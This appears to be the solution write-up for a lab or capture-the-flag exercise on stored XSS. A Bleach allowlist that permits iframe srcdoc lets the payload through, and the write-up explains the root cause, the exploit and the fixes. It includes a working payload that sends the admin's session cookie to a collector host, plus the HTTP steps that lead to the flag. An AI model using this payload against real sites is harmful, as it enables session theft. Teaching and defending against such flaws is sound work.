# Solution — Stored XSS via iframe srcdoc (Bleach allowlist misconfig)

**CWE-79 (Improper Neutralization of Input During Web Page Generation) / OWASP
A03:2021 – Injection.**

## The sink

`POST /posts` sanitizes every note body with Bleach before storing it, but the
allowlist permits `<iframe>` with a `srcdoc` attribute:

```python
ALLOWED_TAGS  = [..., "iframe"]                         # <iframe> is allowed
ALLOWED_ATTRS = { ..., "iframe": ["srcdoc", "width", "height"] }  # so is srcdoc
bleach.clean(body, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)
```

`GET /admin/feed` then renders every stored note as **raw HTML**.

A plain `<script>` note is stripped (script is not in the allowlist), so the
sanitizer _looks_ effective. But an `<iframe srcdoc="...">` note is kept: both the
tag and the attribute are allow-listed. Bleach HTML-escapes the _value_ of
`srcdoc` on output — `<`, `>`, `&`, `"` become entities — so the stored string is
inert _as an attribute string_. That is exactly the trap: the value is not
supposed to stay an attribute string.

## Root cause: an allowlist vets names, not value semantics

Bleach's security model is a **tag/attribute-name allowlist**. It answers "is this
tag allowed?" and "is this attribute allowed on this tag?" — nothing more. It has
no model of what an attribute's value _means_. Most attributes hold opaque data
(`title`, `width`), so escaping the value is sufficient. `srcdoc` is different:
its value is a **complete HTML document** that the browser will later parse and
execute. Allow-listing `srcdoc` therefore silently re-enables arbitrary HTML —
the sanitizer cannot protect you from a construct whose entire purpose is to
smuggle a nested document past it. (`href`/`src` with `javascript:` and SVG
`<use>`/event handlers are the same class of "the value is code, not data"
footgun; `srcdoc` is the sharpest because the value is a _whole page_.)

## The payload

```html
<iframe
  srcdoc="<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script>"
></iframe>
```

Quote nesting: the `srcdoc` attribute uses **double** quotes; the inner JS string
literal uses **single** quotes — no conflict, so nothing needs extra encoding
when you author it. After Bleach escapes the attribute value (it turns `<` into `&lt;`; `>` inside a
quoted attribute value is harmless and left as-is), the stored HTML is literally:

```html
<iframe
  srcdoc="&lt;script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)&lt;/script>"
></iframe>
```

(Confirmed against Bleach 6.2.0.) The `&lt;` keeps the value inert _as an
attribute string_ — the outer `<iframe …>` tag is never broken — which is exactly
why the sanitizer believes it did its job.

## Why `about:srcdoc` runs with the admin's cookies

When the admin's browser renders the feed, it reads the `srcdoc` attribute,
**decodes** the entities back to `<script>…</script>`, and parses that string as
the iframe's document in an **`about:srcdoc`** browsing context. The key fact:

> An `about:srcdoc` document **inherits the origin of its parent** (it is not a
> distinct, opaque origin the way `sandbox` or a `data:` document would be).

Because the srcdoc document shares the parent's origin (`http://app:8080`), it
shares the parent's cookie jar for that origin. The note author never set a
`sandbox` attribute — and Bleach's allowlist would not have added one — so the
frame is script-enabled. `document.cookie` inside the frame therefore returns the
**parent page's** cookies, which include the admin's non-`HttpOnly` `session`.
`new Image().src = …` then fires a cross-origin GET to the collector (image loads
are not blocked by the same-origin _read_ barrier — the request still leaves the
browser, which is all exfiltration needs).

## End-to-end

```
POST /posts
Content-Type: application/json

{"body":"<iframe srcdoc=\"<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script>\"></iframe>"}

# wait for the bot to load /admin/feed (~2s)
GET  /oob/received          # app-side proxy to the collector; find /report?c=session%3D<32hex>
POST /solve   {"c":"<32hex>"}   →  FLAG{...}
```

`tests/exploit.py` automates this: it first asserts `GET /admin/feed` is `403`
without the cookie (proving the bot, not you, is the victim), posts the payload,
polls `/oob/received`, url-decodes and parses the 32-hex session, then calls
`/solve`.

## Why the containment holds

- The collector and admin bot live on a `backend` network with `internal: true`
  — **no route off the host**. The stolen cookie can reach the in-lab collector
  but never the internet, so the lab can ship a real cookie-exfil primitive at
  `risk: low`.
- `/internal/bot-login` (which mints the admin cookie) is firewalled to the
  backend subnet **and** gated by a `BOT_KEY`, so a lab visitor on the public
  side cannot request the admin cookie via `Set-Cookie` and skip the XSS.
- `/admin/feed` is gated to the admin session, so the only way to run script in
  the admin's browser is to plant a note the bot will render — the intended
  stored-XSS path.

## The fixes (independent — either one breaks the exploit)

1. **Fix the allowlist (the source).** Do **not** allow-list `<iframe>` or
   `srcdoc` on user-authored content. Bleach's default allowlist excludes both;
   the moment you re-add them you have opted out of the sanitizer for that
   construct. If embeds are genuinely required, render them server-side from a
   vetted URL allowlist — never from a user-supplied `srcdoc` document — and if a
   frame is unavoidable, force `sandbox` (without `allow-scripts`) so the framed
   document gets an opaque origin and cannot run script or read the parent's
   cookies.
2. **`HttpOnly` session cookie (defence in depth).**
   `Set-Cookie: session=…; HttpOnly` makes `document.cookie` unable to read the
   session, so even a successful HTML injection cannot steal it. Combined with
   `Secure` and `SameSite`, this contains the impact of _any_ future XSS.

A strict `Content-Security-Policy` (e.g. `sandbox`, `frame-src 'none'`, or no
inline script) would also have blocked this specific payload; CSP is explored in
later labs. Fix the allowlist first — it is the actual defect.
